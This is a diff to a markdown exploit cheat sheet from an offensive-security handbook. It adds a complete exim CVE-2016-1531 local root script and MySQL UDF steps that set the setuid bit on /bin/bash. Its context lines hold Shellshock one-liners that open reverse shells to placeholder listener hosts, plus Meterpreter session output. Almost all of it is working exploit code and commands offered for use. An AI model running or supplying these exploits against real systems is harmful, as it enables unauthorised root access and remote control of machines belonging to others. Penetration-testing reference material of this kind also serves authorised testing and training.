@@ -3,6 +3,7 @@
 ## Table of Contents
 
 - [CVE-2014-6271: Shellshock RCE PoC](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2014-6271-Shellshock-RCE-PoC)
+- [CVE-2016-1531: exim LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2016-1531-exim-LPE)
 - [CVE-2019-14287: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2019-14287-Sudo-Bypass)
 - [CVE-2020-1472: ZeroLogon PE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2020-1472-ZeroLogon-PE)
 - [CVE-2021–3156: Sudo / sudoedit LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2021-3156-Sudo--sudoedit-LPE)
@@ -16,6 +17,7 @@
 - [CVE-2023-22809: Sudo Bypass](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-22809-Sudo-Bypass)
 - [CVE-2023-23397: Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#CVE-2023-23397-Microsoft-Outlook-Click-to-Run-PE-0-day-PowerShell-Implementation)
 - [Juicy Potato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Juicy-Potato-LPE)
+- [MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/edit/main/handbooks/cve.md#MySQL-4x50-User-Defined-Function-UDF-Dynamic-Library-2-LPE)
 - [SharpEfsPotato LPE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#SharpEfsPotato-LPE)
 - [Shocker Container Escape](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#Shocker-Container-Escape)
 - [ThinkPHP < 6.0.14 Remote Code Execution RCE](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/cve.md#ThinkPHP--6014-Remote-Code-Execution-RCE)
@@ -119,6 +121,36 @@ $ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http
 $ shellshock='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
 $ <environment_variable>='() { :;}; echo exploit' bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"
 $ <environment_variable>='() { :;}; echo exploit' sudo /root/<binary>
+```
+
+## CVE-2016-1531: exim LPE
+
+- exim version <= 4.84-3
+
+```c
+#!/bin/sh
+# CVE-2016-1531 exim <= 4.84-3 local root exploit
+# ===============================================
+# you can write files as root or force a perl module to
+# load by manipulating the perl environment and running
+# exim with the "perl_startup" arguement -ps. 
+#
+# e.g.
+# [fantastic@localhost tmp]$ ./cve-2016-1531.sh 
+# [ CVE-2016-1531 local root exploit
+# sh-4.3# id
+# uid=0(root) gid=1000(fantastic) groups=1000(fantastic)
+# 
+# -- Hacker Fantastic 
+echo [ CVE-2016-1531 local root exploit
+cat > /tmp/root.pm << EOF
+package root;
+use strict;
+use warnings;
+
+system("/bin/sh");
+EOF
+PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
 ```
 
 ## CVE-2019-14287: Sudo Bypass
@@ -588,6 +620,28 @@ C:\> .\exploit.exe
 ```c
 [*] Sending stage (175174 bytes) to <RHOST>
 [*] Meterpreter session 1 opened (<LHOST>:<LPORT> -> <RHOST>:51990) at 2021-01-31 12:36:26 +0100
+```
+
+## MySQL 4.x/5.0 User-Defined Function (UDF) Dynamic Library (2) LPE
+
+> https://www.exploit-db.com/exploits/1518
+
+```c
+$ gcc -g -c raptor_udf2.c -fPIC
+$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
+```
+
+```c
+$ mysql -u root
+```
+
+```c
+> use mysql;
+> create table foo(line blob);
+> insert into foo values(load_file('/PATH/TO/SHARED_OBJECT/raptor_udf2.so'));
+> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+> create function do_system returns integer soname 'raptor_udf2.so';
+> select do_system('chmod +s /bin/bash');
 ```
 
 ## SharpEfsPotato LPE
